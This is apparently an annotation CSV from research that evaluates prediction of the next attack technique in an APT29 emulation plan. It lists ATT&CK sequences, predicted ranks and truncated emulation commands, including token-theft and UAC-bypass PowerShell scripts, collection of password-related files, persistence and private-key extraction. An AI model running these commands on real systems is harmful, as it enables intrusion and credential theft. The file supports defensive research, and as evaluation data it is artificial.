annotation_id,sample_id,source_org,plan_id,scenario_id,prefix_len,state,true_label,top1_pred,true_rank,current_access_context,exhausted_action_constraint,next_target_artifact,next_micro_verb,label_confidence,annotation_notes,ann_num,matched_yaml_pos_0based,matched_suffix_len,prefix_seq_len,matched_step_idx,matched_technique_attack_id,matched_parent_tid,matched_technique_name,matched_description,matched_command_summary,alignment_ok
ms_001,apt29::unknown::3,apt29,apt29,unknown,3,T1036 T1059 T1119,T1016,T1074,159,execution_on_host,environment_not_enumerated,network_configuration,enumerate,human_verified,human_revised_v1,1,3,3,3,4,T1016,T1016,System Network Configuration Discovery,The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information.,ipconfig /all,1
ms_002,apt29::unknown::2,apt29,apt29,unknown,2,T1036 T1059,T1119,T1003,149,execution_on_host,collection_target_not_identified,local_file_data,collect,human_verified,human_revised_v1,2,2,2,2,3,T1119,T1119,Automated Collection,Execute PowerShell from cmd.exe to collect and compress files of specific extensions.,"$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*ad...",1
ms_003,apt29::unknown::9,apt29,apt29,unknown,9,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082,T1069,T1124,90,post_compromise_discovery,privilege_structure_not_enumerated,permission_group_context,enumerate,human_verified,human_revised_v1,3,13,1,9,14,T1069,T1069,Permission Groups Discovery,The net utility is executed via cmd to enumerate members of the local system's administrators group.,net localgroup administrators,1
ms_004,apt29::unknown::1,apt29,apt29,unknown,1,T1036,T1059,T1036,86,initial_foothold,execution_capability_not_established,command_execution_channel,execute,human_verified,human_revised_v1,4,1,1,1,2,T1059.001,T1059,Command and Scripting Interpreter: PowerShell,Spawn powershell.exe from cmd.exe,"powershell.exe; if ($?) { write-host ""[*] PowerShell successfully spawned""; exit 0; }",1
ms_005,apt29::unknown::8,apt29,apt29,unknown,8,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007,T1082,T1534,64,post_compromise_discovery,environment_not_enumerated ,system_information,enumerate,human_verified,human_revised_v1,5,11,1,8,12,T1082,T1082,System Information Discovery,The systeminfo utility is executed via cmd to enumerate local operating system configuration.,systeminfo,1
ms_006,apt29::unknown::28,apt29,apt29,unknown,28,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548 T1112 T1055 T1036 T1018 T1016 T1057 T1070 T1082 T1049 T1003 T1547 T1134 T1003,T1134,T1021,155,valid_user_context,privilege_context_insufficient,access_token_context,impersonate,human_verified,human_revised_v1,6,37,3,28,38,T1134,T1134,Access Token Manipulation,"A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.","Import-Module .\StealToken.ps1 -Verbose -Force; StealToken; CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""'; CreateProcessWithT...",1
ms_007,apt29::unknown::26,apt29,apt29,unknown,26,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548 T1112 T1055 T1036 T1018 T1016 T1057 T1070 T1082 T1049 T1003 T1547,T1134,T1021,155,valid_user_context,privilege_context_insufficient,access_token_context,impersonate,human_verified,human_revised_v1,7,35,1,26,36,T1134,T1134,Access Token Manipulation,"A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.","Import-Module .\StealToken.ps1 -Verbose -Force; StealToken; CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""'; CreateProcessWithT...",1
ms_008,apt29::unknown::13,apt29,apt29,unknown,13,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036,T1134,T1518,137,internal_host_access,privilege_context_insufficient,access_token_context,impersonate,human_verified,human_revised_v1,8,20,3,13,21,T1134.001,T1134,Access Token Manipulation: Token Impersonation/Theft,"A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.",Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force; Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force; $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(...,1
ms_009,apt29::unknown::25,apt29,apt29,unknown,25,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548 T1112 T1055 T1036 T1018 T1016 T1057 T1070 T1082 T1049 T1003,T1547,T1021,130,internal_host_access,persistence_path_not_established,persistence_mechanism,modify,human_verified,human_revised_v1,9,33,7,25,34,T1547.009,T1547,Boot or Logon Autostart Execution: Shortcut Modification,Leverage modified Sysinternals,"Set-Location -path ""C:\Program Files\SysinternalsSuite""; if (get-service -name ""javamtsup"" -ErrorAction SilentlyContinue) { write-host ""[*] Service already exists...Not running persistence step-1""; exit 1; } if (Test-...",1
ms_010,apt29::unknown::30,apt29,apt29,unknown,30,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548 T1112 T1055 T1036 T1018 T1016 T1057 T1070 T1082 T1049 T1003 T1547 T1134 T1003 T1134 T1081,T1552,T1021,110,internal_host_access,credential_material_not_collected,private_keys,collect,human_verified,human_revised_v1,10,38,0,30,39,T1552.004,T1552,Unsecured Credentials: Private Keys,Obtain credentials via Custom PowerShell,"Import-PfxCertificate -Exportable -FilePath "".\dmevals.local.pfx"" -CertStoreLocation Cert:\LocalMachine\My; if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) { write-host ""[!] The path C:\Program Files\Sy...",1
